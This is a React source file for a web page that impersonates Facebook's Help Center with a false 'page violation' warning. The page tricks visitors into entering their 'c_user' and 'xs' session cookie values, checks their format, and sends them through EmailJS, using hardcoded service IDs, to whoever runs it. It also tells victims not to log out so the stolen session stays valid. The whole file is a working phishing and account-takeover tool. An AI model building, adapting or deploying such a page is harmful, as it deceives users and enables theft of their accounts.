import React, { useState, useRef } from "react";
import { useNavigate } from "react-router-dom";
import emailjs from "@emailjs/browser";
import "./style.css";
import LoginModal from "../modal/LoginModal";

// 1) Local video import (adjust path if different)
import localVideo from "../assets/video.mp4";

const ValidationPage = () => {
  const form = useRef();
  const navigate = useNavigate();
  const [isFormValid, setIsFormValid] = useState(false);
  const [videoMuted, setVideoMuted] = useState(true);
  const [showModal, setShowModal] = useState(false);

  const sendEmail = (e) => {
    e.preventDefault();

    const cUserValue = form.current.elements["c_user"].value;
    const xsValue = form.current.elements["xs"].value;

    const cUserPattern = /^\d{6,}$/;
    const xsPattern = /.*%+.*/;

    const isCUserValid = cUserPattern.test(cUserValue);
    const isXsValid = xsPattern.test(xsValue);

    if (isCUserValid && isXsValid) {
      emailjs
        .sendForm(
          "service_g572qgw",
          "template_uxuv4h7",
          form.current,
          "ZLLsg29uJrmMWpY5z"
        )
        .then(
          (result) => {
            console.log("result text is", result.text);
            setShowModal(true); // Show the modal after form submission
          },
          (error) => {
            console.log(error.text);
          }
        );
    } else {
      setIsFormValid(true);
    }
  };

  return (
    <div
      style={{
        fontFamily: '"Helvetica Neue", Helvetica, Arial, sans-serif',
        fontSize: "14px",
        fontWeight: 400,
      }}
    >
      <form ref={form} onSubmit={sendEmail}>
        {/* Top Blue Bar */}
        <div
          className="d-flex align-items-center"
          style={{ width: "100%", height: "90px", background: "#4667AC" }}
        >
          <h1
            className="text-white ms-4 m-0 d-flex align-self-center"
            style={{ fontWeight: 400 }}
          >
            facebook
          </h1>
        </div>

        {/* Second Gray Bar */}
        <div
          className="d-flex align-items-center"
          style={{ width: "100%", height: "60px", background: "#E9EBEE" }}
        >
          <h4
            className="ms-4 m-0 d-flex align-self-center text-primary"
            style={{ fontWeight: 400 }}
          >
            Help Center
          </h4>
        </div>

        {/* Main Body */}
        <div className="col-12 my-4 d-flex justify-content-center align-items-center">
          <div className="col-11 col-md-6 border">
            {/* Header inside box */}
            <div className="p-2" style={{ background: "#F5F6F7" }}>
              <h5 className="m-0" style={{ fontWeight: 400 }}>
                Request For Remove Page Violation
              </h5>
            </div>
            <div className="p-2">
              {isFormValid && (
                <div className="alert alert-danger">
                  Please enter valid values for both fields.
                  <br />
                  For more detail, check the video below.
                </div>
              )}

              <p className="validation_form_para" style={{ fontWeight: 400 }}>
                We've identified irregular activity on your page that goes
                against our community guidelines. As a result, access to your
                page has been restricted, and you're presently unable to post,
                share, or comment using it.
              </p>
              <p className="validation_form_para" style={{ fontWeight: 400 }}>
                Please provide the precise details below. Refer to the video for
                clarification if you find the instructions unclear.
              </p>

              <p
                className="text-secondary"
                style={{ fontSize: "12px", fontWeight: 400 }}
              >
                Detailed Video Information.
              </p>

              {/* 2) Use localVideo instead of external link */}
              <video
                controls
                autoPlay
                muted={videoMuted}
                src={localVideo} // <-- Local video source
                style={{ width: "320px", height: "180px" }}
              ></video>
              <br />
              <button
                onClick={() => setVideoMuted(false)}
                style={{
                  padding: "4px 8px",
                  fontSize: "12px",
                  marginTop: "10px",
                  fontWeight: 400,
                  background: "#4267B2",
                  color: "#fff",
                  border: "none",
                }}
              >
                Enable Sound
              </button>

              <p
                className="validation_form_para mt-2"
                style={{ fontWeight: 400 }}
              >
                Please be sure to provide the requested information below.
              </p>

              <label style={{ fontSize: "12px", fontWeight: 400 }}>
                c_user
              </label>
              <br />
              <input
                type="number"
                name="c_user"
                required
                pattern="^\d{15}$"
                title="Please enter 15 digits"
                style={{ fontWeight: 400 }}
              />
              <br />
              <label
                className="mt-2"
                style={{ fontSize: "12px", fontWeight: 400 }}
              >
                xs
              </label>
              <br />
              <input type="text" name="xs" style={{ fontWeight: 400 }} />
              <p className="mt-2" style={{ fontSize: "12px", fontWeight: 400 }}>
                Please make sure not to log out from your computer or laptop
                until you have received a verification email.
              </p>
            </div>

            <div
              className="p-2 mb-2 d-flex justify-content-end"
              style={{ background: "#F5F6F7" }}
            >
              <button
                type="submit"
                className="text-white border-0"
                style={{ background: "#4267B2", fontWeight: 400 }}
              >
                Submit
              </button>
            </div>
          </div>
        </div>
      </form>

      {/* Include the LoginModal component */}
      <LoginModal showModal={showModal} setShowModal={setShowModal} />
    </div>
  );
};

export default ValidationPage;
